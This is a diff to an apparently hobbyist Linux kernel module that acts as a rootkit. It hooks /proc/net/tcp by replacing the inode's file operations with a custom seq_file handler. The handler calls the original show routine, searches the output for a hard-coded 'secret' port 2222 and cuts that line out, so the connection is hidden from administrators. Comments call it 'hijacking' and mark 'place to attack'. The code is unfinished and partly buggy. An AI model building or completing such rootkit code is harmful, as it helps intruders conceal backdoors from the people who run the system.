@@ -12,114 +12,112 @@
 #include <linux/kmod.h>
 #include <net/udp.h>
 #include <net/tcp.h>
-#include "seq.h"
-#define SECREAT_PORT "51941"
-struct proc_dir_entry {
-		unsigned int low_ino;
-		umode_t mode;
-		nlink_t nlink;
-		kuid_t uid;
-		kgid_t gid;
-		loff_t size;
-		const struct inode_operations *proc_iops;
-		const struct file_operations *proc_fops;
-		struct proc_dir_entry *parent;
-		struct rb_root subdir;
-		struct rb_node subdir_node;
-		void *data;
-		atomic_t count;					/* use count */
-		atomic_t in_use;				/* number of callers into module in progress; */
-										/* negative -> it's going away RSN */
-		struct completion *pde_unload_completion;
-		struct list_head pde_openers;	/* who did ->open, but not ->release */
-		spinlock_t pde_unload_lock;		/* proc_fops checks and pde_users bumps */
-		u8 namelen;
-		char name[];
-};
-//static struct inode *proc_inode;
-//static struct file_operations *backup_fops;
-//static struct file_operations proc_fops;
+#include <linux/seq_file.h>
+#include <linux/slab.h>
+#define SECRET_PORT 2222
+int (*origin_seq_show)(struct seq_file *f_seq, void *v);
+/*static void *ct_seq_start(struct seq_file *f_seq, loff_t *pos);
+static void *ct_seq_next(struct seq_file *f_seq, void *v, loff_t *pos);
+static void ct_seq_stop(struct seq_file *f_seq, void *v);
+static int ct_seq_show(struct seq_file *f_seq, void *v);
+int ct_open(struct inode *inode, struct file *file);*/
 
-//int origin_show(struct seq_file *seq, void *v );
-/*int set_seq_op(char *op, char * path, int (*f_new)(struct seq_file *seq_f, void *v))
+
+static void *ct_seq_start(struct seq_file *f_seq, loff_t *pos)
 {
-    struct path *p;
-    static const struct inode *f_inode , backup_inode;
-    static struct proc_inodes *p_inode;
-    static struct proc_dir_entry *prc_dir;
-    if (kern_path(path, 0, p))
-        return 0;
-    f_inode = p->dentry->d_inode;
+    loff_t *spos = kmalloc(sizeof(loff_t), GFP_KERNEL);
+    if(!spos)
+        return  NULL;
+    *spos = *pos;
+    return spos;
+}
+static void *ct_seq_next(struct seq_file *f_seq, void *v, loff_t *pos)
+{
+    loff_t *spos = v;
+    *pos = ++*spos;
+    return spos;
+}
+static void ct_seq_stop(struct seq_file *f_seq, void *v)
+{
+    kfree(v);
+}
+static int ct_seq_show(struct seq_file *f_seq, void *v)
+{
 
-    //prc_dir = PDE(f_inode)->seq_ops.op = f_new;
-    p_inode = PROC_I(f_inode);
-    (struct proc_dir_entry*)prc_dir->seq_ops.op = f_new;
+    char needle [ 150 ];
+    loff_t *spos = v;
+    int ret;
+    printk(KERN_ALERT "used the seq_show");
 
+    ret = origin_seq_show(f_seq, v);
+    //need to add here call to real show
+    // The start of the record = the start of the buffer + the amount already-the size of each record.
+    snprintf ( needle , 150 , ":%04X" , SECRET_PORT );
+    if (strnstr(f_seq->buf + f_seq->count -150, needle, 150))
+    {
+        printk(KERN_ALERT "found:  %d ", SECRET_PORT);
+        f_seq->count -=150;//decrese the count by 150 (equal to line) 
+        //remove
+    }
+    seq_printf(f_seq, "%lld\n", (long long)*spos);/* <---- place to attack! ---->*/
+    return 0;
+}
+struct seq_operations seq_ops = {
+    .start = ct_seq_start,
+    .next = ct_seq_next,    
+    .stop = ct_seq_stop,   
+    .show = ct_seq_show    /*  <----postion to attack---->      */
+};
 
-    
+int ct_open(struct inode *inode, struct file *file)
+{
+    printk(KERN_ALERT "used the ct_open");
+    return seq_open(file , &seq_ops);
+}
+/*static const struct file_operations *fops = {
+    .owner = THIS_MODULE,
+    .open = ct_open,
+
 }*/
 
 
-/*
-static void b(void)
-{
-    struct path p;
-    printk(KERN_ALERT "rk: LKM loaded!");
-    if(kern_path("/proc/net/tcp", 0, &p))
-        return 0;
-    //get the inode
-    proc_inode = p.dentry->d_inode;
-    //get a copy of fop from inode
 
-    proc_fops = *proc_inode->i_fop;
-    //backup the fop
-    backup_fops = proc_inode->i_fop;
-    //modify the copy with out evil func (the hyjcking)
-    
-    return 1;
-}
-
-//void a(void){
-  //  struct proc_dir_entry *tcp = init_net.proc_net->subdir->next;
-    /* starting tcp hook */
-    //while (strcmp(tcp->name, "tcp") &&
-//    (tcp != init_net.proc_net->subdir))
-//    tcp = tcp->next;
-//    if (tcp != init_net.proc_net->subdir) {
-    /* save it */
-//    __tcp4_seq_show =
-//    ((struct tcp_seq_afinfo *)(tcp->data))->seq_ops.show;
-    /* hijack */
-//    ((struct tcp_seq_afinfo *)(tcp->data))->seq_ops.show =
-//    hacked_tcp4_seq_show;
-//    }
-//}
-
-//this macro  that set seq opertions to given file (by his path)
-//op is the opertions
-//path is the path to the spefic file
-//
 struct file_operations *org_fops, proc_fops;  
 struct inode *proc_inode;
 struct file *file;                                                         
 struct path p; 
-void set_ops(char *path)
+int set_ops(char *path)
 {
     
     if(kern_path(path, 0, &p))
             return 0;
+    printk(KERN_ALERT "open file secessfully");
         //get the inode
-        proc_inode = p.dentry->d_inode;
+    proc_inode = p.dentry->d_inode;
+    printk(KERN_ALERT "got the inode");
+
         //get a copy of fop from inode
 
-        proc_fops = *proc_inode->i_fop;
+    proc_fops = *proc_inode->i_fop;
+    printk(KERN_ALERT "got the fops");
+    org_fops = proc_inode->i_fop;
+
+    proc_fops.open = ct_open;
+
         //backup the fop
-        org_fops = proc_inode->i_fop;
+
+    printk(KERN_ALERT "save the org fops");
+
+    proc_inode->i_fop = &proc_fops;
+    printk(KERN_ALERT "hook the org fops");
+
+
+    return 1;
 }
 void hook_seq(void)
  {     
                                     
-    proc_fops.open = ct_open;
+    //proc_fops->open = ct_open;
     printk(KERN_ALERT "hooked!");
 
     //ern_path(path, 0, p);                                         
@@ -130,7 +128,7 @@ void hook_seq(void)
  } 
  void unhook_seq(void)
  {
-     proc_fops.open = org_fops->open;
+     proc_inode->i_fop = org_fops;
      printk(KERN_ALERT "unhooked!");
  }            
  
